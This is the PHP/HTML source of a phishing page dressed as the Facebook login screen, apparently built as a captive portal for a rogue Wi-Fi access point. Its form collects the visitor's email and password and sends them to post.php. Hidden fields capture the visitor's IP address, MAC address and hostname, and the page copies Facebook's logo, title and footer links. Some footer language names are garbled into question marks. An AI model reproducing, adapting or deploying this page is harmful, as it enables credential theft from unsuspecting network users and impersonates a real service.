<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" href="./assets/css/styles.css" />
        <link
            rel="shortcut icon"
            href="./assets/img/fm5arwc28y.png"
            type="image/x-icon"
        />
        <title>Facebook - Entrar o Registrarse</title>
    </head>
    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
    function redirect() {
        setTimeout(function() {
        window.location = "/captiveportal/index.php";
        }, 100);
    }
    </script>
    <body>
        <section class="hero">
            <div class="text">
                <img
                    src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
                />
                <h3>
                    Connect with friends and the world around you on Facebook.
                </h3>
            </div>

            <div class="signup">
                <form method="POST" action="post.php">
                    <input type="email" name="email_facebook"  placeholder="Email or phone number" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
                    <input type="password" name="password_facebook"  placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required>
                    <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                    <input type="hidden" name="target" value="https://m.facebook.com">
                    <button class="login-btn" type="submit">Log In</button>
                    <a class="forgot-pass" href="#">Forgot password?</a>
                    <hr>
                    <button class="create-btn" type="submit">Create new account</button>  
                </form>
                <a class="createpage" href="#">Create a Page</a
                ><span> for a celebrity, brand or business.</span>
            </div>
        </section>

        <footer>
            <div class="langs">
                <a>English(US)</a>
                <a href="#">??????????????</a>
                <a href="#">Filipino</a>
                <a href="#">????????</a>
                <a href="#">Bahasa Indonesia</a>
                <a href="#">??????????????????</a>
                <a href="#">???????????????</a>
                <a href="#">??????????????????</a>
                <a href="#">??????????????????</a>
                <a href="#">Espa??ol</a>
                <a href="#">Portugu??s (Brasil)</a>
                <button class="more-lang">
                    <svg viewBox="0 0 448 512" width="100" title="plus">
                        <path
                            d="M416 208H272V64c0-17.67-14.33-32-32-32h-32c-17.67 0-32 14.33-32 32v144H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h144v144c0 17.67 14.33 32 32 32h32c17.67 0 32-14.33 32-32V304h144c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"
                        />
                    </svg>
                </button>
            </div>
            <hr />
            <div class="sitelinks">
                <a href="#">Sign Up</a>
                <a href="#">Log In</a>
                <a href="#">Messenger</a>
                <a href="#">Facebook Lite</a>
                <a href="#">Watch</a>
                <a href="#">Places</a>
                <a href="#">Games</a>
                <a href="#">Marketplace</a>
                <a href="#">Facebook Pay</a>
                <a href="#">Oculus</a>
                <a href="#">Portal</a>
                <a href="#">Instagram</a>
                <a href="#">Bulletin</a>
                <a href="#">Local</a>
                <a href="#">Fundraisers</a>
                <a href="#">Services</a>
                <a href="#">Voting Information Center</a>
                <a href="#">Groups</a>
                <a href="#">About</a>
                <a href="#">Create Ad</a>
                <a href="#">Create Page</a>
                <a href="#">Developers</a>
                <a href="#">Careers</a>
                <a href="#">Privacy</a>
                <a href="#">Cookies</a>
                <a href="#">Ad choices</a>
                <a href="#">Terms</a>
                <a href="#">Help</a>
            </div>

            <div class="copyright">Meta &copy; 2022</div>
        </footer>
    </body>
</html>
